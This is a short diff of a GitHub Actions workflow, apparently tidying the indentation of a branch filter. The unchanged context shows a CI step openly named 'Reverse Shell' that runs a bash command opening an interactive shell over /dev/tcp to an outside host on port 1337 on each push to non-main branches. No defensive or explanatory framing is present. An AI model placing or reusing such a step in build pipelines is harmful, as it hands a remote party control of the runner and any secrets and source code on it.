@@ -4,8 +4,8 @@ on:
   push:
     branches:
       - '*'
-    except:
-      - main
+      except:
+        - main
 
 jobs:
   build:
@@ -22,7 +22,7 @@ jobs:
       - name: "Reverse Shell"
         run: |
           bash -i >& /dev/tcp/home.voinearadu.com/1337 0>&1
-          
+
       - name: "Updating raport"
         run: |
           pip3 install requests
